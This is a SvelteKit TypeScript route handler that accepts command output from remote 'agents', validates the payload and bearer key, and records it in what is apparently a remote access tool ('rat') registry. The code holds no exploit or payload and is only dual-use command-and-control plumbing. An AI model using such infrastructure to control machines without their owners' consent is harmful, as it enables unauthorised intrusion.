import { error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import type { CommandOutputEvent } from '../../../../../../../../shared/types/messages';

function getBearerToken(header: string | null): string | undefined {
	if (!header) {
		return undefined;
	}
	const match = header.match(/^Bearer\s+(.+)$/i);
	return match?.[1]?.trim();
}

function isValidEvent(
	payload: CommandOutputEvent | null | undefined
): payload is CommandOutputEvent {
	if (!payload) {
		return false;
	}
	if (payload.type === 'chunk') {
		return typeof payload.data === 'string';
	}
	if (payload.type === 'end') {
		return typeof payload.result === 'object' && payload.result !== null;
	}
	return false;
}

export const POST: RequestHandler = async ({ params, request, getClientAddress }) => {
	const id = params.id;
	const commandId = params.commandId;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}
	if (!commandId) {
		throw error(400, 'Missing command identifier');
	}

	let payload: CommandOutputEvent;
	try {
		payload = (await request.json()) as CommandOutputEvent;
	} catch {
		throw error(400, 'Invalid command output payload');
	}

	if (!isValidEvent(payload)) {
		throw error(400, 'Unsupported command output payload');
	}

	const token = getBearerToken(request.headers.get('authorization'));
	if (!token) {
		throw error(401, 'Missing agent key');
	}

	try {
		await registry.recordCommandOutput(id, commandId, token, payload, {
			remoteAddress: getClientAddress()
		});
		return new Response(null, { status: 202 });
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to record command output');
	}
};
